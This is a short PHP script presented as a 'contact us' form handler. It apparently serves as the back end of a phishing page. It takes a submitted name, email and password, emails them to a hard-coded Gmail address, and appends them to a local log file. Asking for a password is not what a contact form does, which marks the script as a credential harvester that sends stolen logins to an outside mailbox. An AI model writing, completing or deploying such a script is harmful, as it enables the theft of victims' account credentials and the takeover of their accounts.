<?php
$to = 'opeyemibusuyi@gmail.com';
$subject = "contact us";

$name = isset($_POST['name']) ? trim($_POST['name']) : '';
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

$message = "'$name' . '$email' . '$password'";
$additional_headers = "additional headers";
$mail = mail($to, $subject, $message, $additional_headers);

$new2 = "$subject . $message . $additional_headers";

 $fp = fopen("james.txt","a");

    fputs($fp,$new2);

    fclose($fp);

?>